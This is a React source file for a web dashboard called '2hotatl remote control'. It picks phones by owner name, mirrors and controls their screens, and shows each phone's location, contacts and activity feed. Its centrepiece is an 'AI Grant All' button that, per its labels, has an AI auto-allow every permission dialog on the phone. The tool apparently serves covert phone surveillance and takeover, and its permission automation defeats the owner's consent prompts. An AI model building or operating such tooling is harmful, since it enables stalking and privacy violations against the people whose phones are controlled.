import { useEffect, useMemo, useRef, useState } from "react";
import { ActivityFeed } from "./components/ActivityFeed";
import { AiPanel } from "./components/AiPanel";
import { ContactsPanel } from "./components/ContactsPanel";
import { ControlBoard } from "./components/ControlBoard";
import { LocationPanel } from "./components/LocationPanel";
import { useAgent } from "./hooks/useAgent";
import { useLiveStream } from "./hooks/useRelayStream";
import { clientToDevice } from "./utils/coords";

function statusLabel(
  selectedDeviceId: string | null,
  phoneLive: boolean,
  connected: boolean,
  activeName: string,
  deviceName: string,
) {
  if (!selectedDeviceId) return { text: "No phone", tone: "muted" as const };
  if (phoneLive) return { text: `Live · ${activeName || deviceName}`, tone: "live" as const };
  if (connected) return { text: "Connecting…", tone: "warn" as const };
  return { text: "Offline", tone: "muted" as const };
}

export default function App() {
  const [ripples, setRipples] = useState<{ id: number; x: number; y: number }[]>([]);
  const [aiOpen, setAiOpen] = useState(false);
  const rippleId = useRef(0);

  const {
    connected,
    phoneLive,
    deviceSize,
    devices,
    selectedDeviceId,
    activeDeviceName,
    selectDevice,
    send,
    getTree,
    getTreeTick,
    waitForTree,
    hasRecentTree,
    activityFeed,
    location,
    contacts,
    setupProgress,
    clearSetupProgress,
  } = useLiveStream();

  const agent = useAgent(send, getTree, waitForTree, getTreeTick, phoneLive, hasRecentTree);
  const canControl = connected && !!selectedDeviceId && phoneLive;
  const canSendKeys = connected && !!selectedDeviceId;
  const screenRef = useRef<HTMLDivElement>(null);
  const dragRef = useRef<{ x: number; y: number; t: number } | null>(null);
  const selectedDevice = devices.find((d) => d.deviceId === selectedDeviceId);
  const status = statusLabel(
    selectedDeviceId,
    phoneLive,
    connected,
    activeDeviceName,
    selectedDevice?.name ?? "phone",
  );

  const screenHint = useMemo(() => {
    if (!selectedDeviceId) return "Choose a phone above";
    if (!phoneLive) return selectedDevice ? `${selectedDevice.name} is offline` : "Phone offline";
    return "Tap or swipe to control";
  }, [selectedDeviceId, phoneLive, selectedDevice]);

  const onWake = () => send({ type: "key", action: "wake" });
  const onPower = () => send({ type: "key", action: "power" });
  const onKey = (action: string) => send({ type: "key", action });
  const onGrantAll = () => {
    clearSetupProgress();
    send({ type: "setup_takeover" });
  };

  useEffect(() => {
    if (!setupProgress?.done) return;
    const t = setTimeout(clearSetupProgress, 8000);
    return () => clearTimeout(t);
  }, [setupProgress?.done, setupProgress?.at, clearSetupProgress]);

  const toDeviceCoords = (clientX: number, clientY: number) => {
    const el = screenRef.current;
    if (!el) return null;
    return clientToDevice(clientX, clientY, el.getBoundingClientRect(), deviceSize.width, deviceSize.height);
  };

  const addRipple = (x: number, y: number) => {
    const id = ++rippleId.current;
    setRipples((r) => [...r, { id, x, y }]);
    setTimeout(() => setRipples((r) => r.filter((rr) => rr.id !== id)), 600);
  };

  const onPointerDown = (e: React.PointerEvent) => {
    if (!canControl) return;
    const coords = toDeviceCoords(e.clientX, e.clientY);
    if (!coords) return;
    dragRef.current = { x: coords.x, y: coords.y, t: Date.now() };
    addRipple(coords.localX, coords.localY);
    (e.currentTarget as HTMLElement).setPointerCapture(e.pointerId);
  };

  const onPointerUp = (e: React.PointerEvent) => {
    if (!canControl) return;
    const start = dragRef.current;
    dragRef.current = null;
    if (!start) return;
    const coords = toDeviceCoords(e.clientX, e.clientY);
    if (!coords) return;
    const dt = Date.now() - start.t;
    const dist = Math.hypot(coords.x - start.x, coords.y - start.y);
    if (dist < 12 && dt < 300) send({ type: "tap", x: coords.x, y: coords.y });
    else if (dist >= 12) {
      send({
        type: "swipe",
        x: start.x,
        y: start.y,
        x2: coords.x,
        y2: coords.y,
        duration: Math.min(Math.max(dt, 50), 600),
      });
    }
  };

  return (
    <div className="app app-cockpit">
      <div className="bg-glow bg-glow-1" />
      <div className="bg-glow bg-glow-2" />

      <header className="header header-minimal">
        <div className="logo">
          <span className="logo-icon">◉</span>
          <div>
            <h1>2hotatl</h1>
            <p className="tagline">remote control</p>
          </div>
        </div>
        <div className="status-pills">
          <select
            className="device-select"
            value={selectedDeviceId ?? ""}
            onChange={(e) => selectDevice(e.target.value || null)}
            aria-label="Select phone"
          >
            <option value="">Choose phone…</option>
            {devices.map((d) => (
              <option key={d.deviceId} value={d.deviceId}>
                {d.online ? "● " : "○ "}
                {d.ownerName ? `${d.ownerName} · ` : ""}
                {d.name}
              </option>
            ))}
          </select>
          <span className={`pill pill-status pill-${status.tone}`}>{status.text}</span>
          <button
            type="button"
            className={`btn-grant-all ${setupProgress && !setupProgress.done ? "btn-grant-all-active" : ""}`}
            onClick={onGrantAll}
            disabled={!canSendKeys || (setupProgress != null && !setupProgress.done)}
            title={canSendKeys ? "One tap — AI allows every permission on the phone" : "Select a phone first"}
          >
            <span className="btn-grant-icon">⚡</span>
            AI Grant All
          </button>
          <a className="pill pill-link" href="/watch">Watch</a>
        </div>
      </header>

      {setupProgress && (
        <div className={`grant-banner grant-banner-${setupProgress.phase}`}>
          <span className="grant-banner-pulse" aria-hidden />
          <span className="grant-banner-text">{setupProgress.line}</span>
          {setupProgress.done && (
            <button type="button" className="grant-banner-dismiss" onClick={clearSetupProgress}>✕</button>
          )}
        </div>
      )}

      <main className="cockpit">
        <div className="cockpit-left">
          <ActivityFeed items={activityFeed} phoneLive={phoneLive} />
          <LocationPanel location={location} />
          <ContactsPanel contacts={contacts} />
        </div>

        <div className="cockpit-center">
          <div className="phone-stage phone-stage-large">
            <div className="phone-shadow" />
            <div className="phone-frame phone-frame-large">
              <div className="phone-notch" />
              <div
                ref={screenRef}
                className={`phone-screen phone-screen-live ${canControl ? "phone-screen-ready" : "phone-screen-wait"}`}
                onPointerDown={onPointerDown}
                onPointerUp={onPointerUp}
                onPointerCancel={() => { dragRef.current = null; }}
              >
                {!canControl && (
                  <div className="screen-hint">
                    <span className="screen-hint-icon">{phoneLive ? "◉" : "○"}</span>
                    <p>{screenHint}</p>
                    {canSendKeys && !phoneLive && (
                      <button type="button" className="btn-wake-inline" onClick={onWake}>Wake phone</button>
                    )}
                  </div>
                )}
                {canControl && <div className="screen-touch-grid" aria-hidden />}
                {ripples.map((r) => (
                  <span key={r.id} className="ripple" style={{ left: r.x, top: r.y }} />
                ))}
              </div>
              <div className="phone-chin" />
            </div>
            <p className="screen-caption">{screenHint}</p>
          </div>
        </div>

        <div className="cockpit-right">
          <div className="grant-hero glass-panel">
            <p className="grant-hero-title">⚡ AI Grant All Permissions</p>
            <p className="grant-hero-sub">One tap — AI auto-allows every dialog on the phone</p>
            <button
              type="button"
              className="btn-grant-hero"
              onClick={onGrantAll}
              disabled={!canSendKeys || (setupProgress != null && !setupProgress.done)}
            >
              {setupProgress && !setupProgress.done ? "Granting…" : "Grant All Now"}
            </button>
            {!selectedDeviceId && <p className="grant-hero-hint">Choose a phone above first</p>}
            {selectedDeviceId && !canSendKeys && <p className="grant-hero-hint">Connecting to phone…</p>}
          </div>
          <ControlBoard
            canControl={canControl}
            canSendKeys={canSendKeys}
            phoneLive={phoneLive}
            onWake={onWake}
            onPower={onPower}
            onSetup={onGrantAll}
            onKey={onKey}
            onAiToggle={() => setAiOpen((v) => !v)}
            aiOpen={aiOpen}
          />
          {aiOpen && (
            <AiPanel
              agent={agent}
              tree={getTree()}
              disabled={!canSendKeys || agent.running}
              connected={connected}
              phoneLive={phoneLive}
            />
          )}
        </div>
      </main>
    </div>
  );
}
